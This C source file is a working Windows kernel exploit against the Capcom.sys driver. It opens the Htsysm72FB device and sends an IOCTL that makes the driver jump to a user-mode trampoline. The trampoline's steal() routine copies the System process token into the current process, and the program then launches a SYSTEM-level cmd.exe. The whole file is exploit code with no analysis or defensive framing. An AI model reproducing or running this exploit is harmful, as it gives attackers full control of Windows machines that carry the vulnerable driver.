#include <Windows.h>
#include <stdint.h>
#include <stdio.h>

#define IOCTL 0xAA013044
HANDLE hDevice;

__declspec(noinline) void steal(void* x) {
    uint64_t me = *(uint64_t*)(__readgsqword(0x188) + 0x220);
    uint64_t sys = me;
    do { sys = *(uint64_t*)(sys + 0x448) - 0x448; } while (*(uint64_t*)(sys + 0x440) != 4);
    *(uint64_t*)(me + 0x4b8) = *(uint64_t*)(sys + 0x4b8);
}

int main() {
    hDevice = CreateFileA("\\\\.\\Htsysm72FB",
        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Device open failed: %d\n", GetLastError()); return 1;
    }
    printf("[+] Device opened\n");

    BYTE t[] = { 0,0,0,0,0,0,0,0,         //  Capcom jumps here : b+8
                 0xE8,8,0,0,0,             // CALL +8
                 0,0,0,0,0,0,0,0,          // steal() 
                 0x58,0xFF,0x20 };         // POP RAX; JMP [RAX]

    PBYTE buffer = VirtualAlloc(NULL, 24, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!buffer) { printf("[-] VirtualAlloc failed: %d\n", GetLastError()); return 1; }

    memcpy(buffer, t, 24);                              // copy trampoline bytes
    *(uint64_t*)(buffer + 0x00) = (uint64_t)(buffer + 8);// [0x00] b+8
    *(uint64_t*)(buffer + 0x0D) = (uint64_t)steal;     // [0x0D] = 13 steal()

    printf("[+] Trampoline at  : %p\n", buffer);
    printf("[+] steal() at     : %p\n", steal);

    uint64_t point = (uint64_t)(buffer + 8);
    DWORD out = 0, br = 0;
    BOOL result = DeviceIoControl(hDevice, IOCTL, &point, 8, &out, 4, &br, NULL);
    if (!result) { printf("[-] IOCTL failed: %d\n", GetLastError()); return 1; }
    printf("[+] IOCTL succeeded — token stolen\n");

    system("cmd.exe");
}
